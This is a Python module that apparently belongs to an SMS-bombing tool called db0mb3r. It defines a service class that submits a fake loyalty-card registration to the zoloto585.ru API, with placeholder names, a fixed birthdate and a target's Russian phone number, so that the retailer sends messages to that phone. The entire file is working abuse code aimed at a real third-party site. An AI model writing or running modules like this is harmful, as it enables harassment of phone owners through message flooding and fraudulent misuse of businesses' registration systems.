from db0mb3r.services.service import Service


class Zoloto585(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": self.russian_name,
                "surname": self.russian_name,
                "patronymic": self.russian_name,
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone": self.format(self.formatted_phone, "+* (***) ***-**-**"),
                "email": self.email,
                "city": "Москва",
            },
        )
